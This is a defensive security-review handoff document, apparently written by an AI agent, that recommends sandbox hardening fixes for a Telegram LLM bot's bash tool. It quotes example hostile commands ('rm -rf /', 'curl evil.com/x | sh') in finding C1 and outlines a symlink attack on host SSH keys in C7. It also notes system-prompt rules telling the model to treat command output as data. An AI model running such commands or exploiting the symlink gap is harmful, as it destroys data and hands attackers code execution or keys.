# SANDBOX-RECOMMENDATIONS — Qwen 3.8-Max review of OpenWebUI-bash-sandbox

> **Audience:** the maintainer of
> [vaskes/OpenWebUI-bash-sandbox](https://github.com/vaskes/OpenWebUI-bash-sandbox)
> ("sandbox-mavis" below). This file collects the issues the
> Qwen 3.8-Max adversarial review raised against the
> bash-sandbox side-car that are out of scope for the bot
> repo (vaskes/llama.cpp_telegram) but in scope for the
> sandbox repo.
>
> **Source review:** 2026-10-14 adversarial review of
> `llama.cpp_telegram` v0.11.0-pre + `OpenWebUI-bash-sandbox`
> v2.3.0 (tag a3fa2f2). The bot-side part of the review is
> already addressed in commit `dc2731e`; this document is
> just the sandbox-side remainder.
>
> **Severity scale:** 🔴 CRITICAL = production-blocker, 🟠
> HIGH = should fix in next release, 🟡 MEDIUM = nice to
> have, 🟢 LOW = style / future work.

## Context: who is calling the sandbox and why

The `vaskes/llama.cpp_telegram` bot (the Telegram frontend
operator runs) has a `bash_command` tool (T38, gated to
`LLAMABOT_DEPLOYMENT_PROFILE=personal`). When the LLM inside
the bot calls `bash_command`, the bot forwards the call over
HTTP to the openapi-proxy at `AGENT_STACK_URL` (default
`http://192.168.10.7:8090`) with a bearer token. The
openapi-proxy then drives a tmux session in the
sandbox-agent container.

The bot-side defence in depth (already deployed in
`llama.cpp_telegram` commit `dc2731e`):

  - Profile gate (bash only in personal mode)
  - Tool isolation whitelist (bot only dispatches the 6
    whitelisted tool names)
  - System prompt safety rules (refuse destructive
    commands, refuse network execution, treat command
    output as data not instructions)
  - Per-session rate limit (10 cmd/min, short-circuit
    before network call)
  - Bearer token auth on every sandbox call

This means **the bot is not relying on the sandbox for any
of the above**. The sandbox is a black box: the bot sends
JSON in, gets JSON out. The bot's only assumption is that
the sandbox executes the command and returns the output.

What that means for you: the issues below are about the
sandbox's own safety posture, not about its protocol with
the bot. Most of them are about audit trails, session
limits, and protocol hardening. None of them require
coordination with the bot repo.

---

## 🔴 C1 — No command content logging (CRITICAL)

**File:** `agent_api.py:471-474` (approx — verify exact
line at the current commit)

**Current behaviour:**
```python
logger.info(
    "exec sid=%s exit=%s duration_ms=%d cmd_len=%d",
    sid, exit_code, duration_ms, len(body.command),
    # ^ logs only the LENGTH, not the command itself
)
```

**Risk:** if the LLM (or a prompt-injected user) runs
`rm -rf /` or `curl evil.com/x | sh`, the audit log will
only show `cmd_len=12`. The operator reading the log
post-incident has no way to know what was actually
executed.

**Fix (recommended):**
```python
# Truncate the command text in the log so that
# unexpectedly-huge commands don't flood the log,
# but keep enough to reconstruct the action.
cmd_preview = body.command if len(body.command) <= 200 else body.command[:200] + f"... (+{len(body.command) - 200} bytes)"
logger.info(
    "exec sid=%s exit=%s duration_ms=%d cmd_len=%d cmd=%r",
    sid, exit_code, duration_ms, len(body.command), cmd_preview,
)
```

**Wider audit trail improvements (out of immediate scope
but worth planning):**
  - Log the **caller's bearer-token ID** (last 8 chars
    only — do not log the whole token) so audit can
    attribute commands to operators in a multi-tenant
    deployment. Today, multiple operators sharing one
    sandbox deployment are indistinguishable in the log.
  - Log the **command's working directory** (from the
    tmux session) so audit can reconstruct state.
  - Log **stderr** separately from stdout (right now
    they are merged into one captured pane; merging is
    documented in our tests/test_shell_integration.py
    and operators are aware, but for audit purposes
    keeping the two streams separate is better).

**Why it's CRITICAL:** an unauditable sandbox is a
compliance and post-incident-response liability. Even
single-tenant personal use benefits from "what did the
bot do at 23:04 yesterday?" being answerable from logs.

---

## 🟠 C7 — SSH identity symlink bypass (HIGH, MEDIUM in Qwen)

**File:** `openapi_proxy.py:156-173` (Qwen's anchor; verify
exact line at the current commit)

**Current behaviour:**
```python
def _ssh_identity_within_workspace(path: str) -> bool:
    if not path:
        return False
    try:
        real = os.path.realpath(path)
    except (OSError, ValueError):
        return False
    if not os.path.isfile(real):
        return False
    # ... uses `real` going forward
```

**Attack Qwen describes:**
1. Attacker creates a key file inside `/workspace` — it
   passes the `realpath` check because it is a regular
   file in the workspace.
2. Attacker **replaces** the file with a symlink to, say,
   `/home/agent/.ssh/id_rsa` (which is bind-mounted
   read-only from the host).
3. `realpath` now resolves to the real key.
4. The SSH command that uses this `-i` path uses the
   real key, not the file that was validated.

Qwen's recommended fix is to also reject symlinks:
```python
if os.path.islink(path):
    return False
```

**Wider issue:** the validation happens at one moment in
time. The TOCTOU between validation and use is the real
attack surface. A more robust pattern:

  - Open the file with `O_NOFOLLOW` (refuse to follow
    symlinks at open time, not at validation time).
  - Or, even better, scope the validation to a **stable
    inode** the sandbox created itself, not a file the
    user can rename/symlink.

**Why it matters:** if a user can run `ssh -i
/workspace/foo user@host`, the sandbox's "this identity
file is inside the workspace" check is the only thing
preventing them from using host-resident keys. Today the
check can be bypassed; the fix is a few lines.

**Severity note:** Qwen rated this MEDIUM. We agree with
that — the attacker needs write access to /workspace to
plant the symlink, and the SSH session they would gain
access to is whatever the sandbox-agent's keys are
authorised for. But the fix is cheap and the upside is
large; do it.

---

## 🟡 M1 — Token storage is plaintext in .env (MEDIUM)

**Files:** `/etc/agent-stack.env`, operator's
`/opt/telegram-bot/.env` and `/opt/bash-sandbox/.env`.

**Current state:** `OPENAPI_PROXY_TOKEN` and
`AGENT_STACK_TOKEN` (the same value, by the way — the bot
and the sandbox share a bearer secret) are stored in
`.env` files with mode 0600 on a single operator's host.

**For a personal / single-operator deployment this is
fine.** The threat model is "someone with shell on my
host reads my .env", and the operator is already past
that line.

**For a multi-tenant / hosted deployment this is not
fine.** Qwen's recommendation of Docker secrets or
HashiCorp Vault is correct for that model. We are
deliberately not implementing this in the bot repo
because the bot's deployment model is single-tenant
personal. If you are planning a hosted / multi-tenant
sandbox, this is the highest-leverage thing to fix.

**If you do implement Docker secrets:**

  - The bot needs to read `AGENT_STACK_TOKEN` from a
    file in `/run/secrets/...` instead of from env.
    That is a one-line change in the bot's
    `personal_tools/bash_command.py`.
  - The openapi-proxy needs the same on its side.
  - The compose file changes are: `secrets:` block
    instead of `environment:` for the token.

Coordinate with the bot repo before shipping, because
the env-var contract is part of the bot's docs
(docs/BASH-SANDBOX.md).

---

## 🟡 M2 — No per-chat session count limit (MEDIUM)

**Risk:** the sandbox has `pids_limit: 256` per container,
which catches the actual fork bomb. But the bot can
create an unbounded number of tmux sessions (one per
`session_id`). Today `session_id` is `chat-{chat_id}` so
the limit is "one session per chat", which is fine.

If at some point the bot's session_id scheme changes (for
example, to `chat-{chat_id}-{user_id}` to separate
multiple users in the same chat, or to a per-message
id for stateless shells), the sandbox can be told to
create N sessions, each pinning a tmux server process
and some memory. There is no upper bound enforced by the
sandbox today.

**Recommended fix (low effort, high value):**
```python
# In openapi_proxy.py session-creation path:
MAX_SESSIONS_PER_SANDBOX = 64

if len(active_sessions) >= MAX_SESSIONS_PER_SANDBOX:
    # Evict the least-recently-used session before
    # creating a new one. tmux session is destroyed;
    # state is lost but the next call will create a
    # fresh one transparently.
    evict_lru_session()
```

The LRU policy is the right one because the bot's
session_id is deterministic, so a session that has not
been used recently is, by definition, a session whose
operator has moved on.

---

## 🟡 M3 — WebSocket terminal has no idle timeout (MEDIUM)

**File:** `openapi_proxy.py:540-600` (Qwen's anchor)

**Risk:** a WebSocket connection opened via the `/ws`
endpoint can stay open forever, holding memory and a
file descriptor. A misbehaving client (or just a tab left
open in a browser) is a slow resource leak.

**Fix (Qwen's recommendation, accepted):**
```python
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    last_activity = time.time()
    IDLE_TIMEOUT = 300  # 5 minutes
    while True:
        try:
            data = await asyncio.wait_for(
                websocket.receive_text(),
                timeout=IDLE_TIMEOUT,
            )
            last_activity = time.time()
            # process data
        except asyncio.TimeoutError:
            if time.time() - last_activity > IDLE_TIMEOUT:
                await websocket.close(reason="idle timeout")
                break
        except WebSocketDisconnect:
            break
```

The 5-minute idle timeout is what most production
WebSocket servers use. Make it configurable via env if
you want operators to tune it for their workloads.

---

## Items we are NOT asking you to change

These came up in the Qwen review but we explicitly
**rejected** them on the bot side. If Qwen or a future
reviewer asks you to mirror them in the sandbox, here
is the reasoning so you do not have to re-derive it:

  - **session_id being `chat-{chat_id}` (deterministic,
    not random).** The bot's design rationale is in
    `call_llama.py:1318-1337`. The sandbox does not
    need to do anything; the bot's caller always sends
    a session_id, and the sandbox honours whatever it
    receives. If you do add a sanity check (e.g.
    "session_id must look like `chat-N` or be a uuid"),
    keep it permissive — the bot may change its scheme
    in a future version and we want the sandbox to be
    forward-compatible.

  - **Bearer-token format.** The bot sends
    `Authorization: Bearer <token>`. The sandbox
    validates the token. Qwen did not raise any
    concerns about the token format; we are not
    requesting any change here.

---

## Suggested order of work (if you take any of this)

1. **C1** — command content logging. One-line fix in
   `agent_api.py`. ~30 minutes including tests. Highest
   leverage; do this first.
2. **C7** — symlink rejection on SSH identity paths.
   One-line fix in `openapi_proxy.py` plus a test
   (plant a symlink, verify the call is rejected).
   ~1 hour.
3. **M3** — WebSocket idle timeout. ~2 hours including
   tests. Useful regardless of any other change.
4. **M2** — per-sandbox session LRU eviction. ~4 hours
   including tests. Only worth it if the bot ever
   changes its session_id scheme. If single-tenant
   personal use is the only deployment model, you can
   skip this.
5. **M1** — Docker secrets for the bearer token. Only
   relevant if a multi-tenant deployment is on the
   roadmap. Coordinate with the bot repo before
   shipping because the env-var contract is documented
   in `docs/BASH-SANDBOX.md` and the bot's
   `personal_tools/bash_command.py` would need a
   matching change to read from `/run/secrets/`.

If you tackle C1, C7, and M3 in one release, the sandbox
repo will be back in front of the security review curve
for the personal / single-tenant deployment model. The
rest is forward-looking.

---

## How to verify these fixes

For each fix, add a test in the sandbox repo's test
suite (you have one — see vaskes/OpenWebUI-bash-sandbox
v2.3.0 review). The bot repo's `tests/test_shell_integration.py`
covers the bot-to-sandbox protocol; it will continue to
pass as long as the wire format is unchanged, which is
all the fixes above preserve.

If a fix changes the wire format (none of the above do,
but for future work), update `docs/BASH-SANDBOX.md` in
the bot repo so the operator runbook stays in sync.

---

## Cross-references

  - `vaskes/llama.cpp_telegram` v0.11.0-pre, commit
    `dc2731e` (the bot-side T51 fixes)
  - `vaskes/llama.cpp_telegram` `docs/BASH-SANDBOX.md`
    (operator-facing integration guide)
  - `vaskes/OpenWebUI-bash-sandbox` v2.3.0 (tag a3fa2f2,
    the sandbox this review is against)

— Mavis Agent (mavis@kuduza.ai), 2026-10-14
